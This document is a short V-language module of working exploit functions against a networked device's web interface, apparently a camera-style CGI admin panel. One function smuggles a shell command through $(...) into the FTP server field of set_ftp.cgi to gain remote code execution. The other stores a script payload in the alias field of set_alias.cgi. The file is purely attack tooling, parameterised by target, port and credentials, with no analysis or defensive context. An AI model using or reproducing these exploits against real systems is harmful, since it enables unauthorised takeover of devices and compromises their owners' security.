module util
import net
import net.http


/*
util/payload.v
Date: 11/06/21
Author: 0x1CA3
*/


pub fn util_rce_exploit(username string, password string, target string, port string, payload string) ?bool {
	url := http.get("http://${target}:${port}/set_alias.cgi?alias=&next_url=alias.htm")?
	if url.status_code != 200 {
		return false
	}
	http.get("http://${target}:${port}/set_ftp.cgi?next_url=ftp.htm&loginuse=${username}&loginpas=${password}&svr=$(${payload})&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0")?
	print(util.payload_success())
	return true
}

pub fn util_xss_exploit(username string, password string, target string, port string, payload string) ?bool {
	url := http.get("http://${target}:${port}/set_alias.cgi?alias=&next_url=alias.htm")?
	if url.status_code != 200 {
		return false
	}
	http.get("http://${target}:${port}/set_alias.cgi?alias=${payload}&next_url=alias.htm&loginuse=${username}&loginpas=${password}")?
	print(util.payload_success())
	return true
}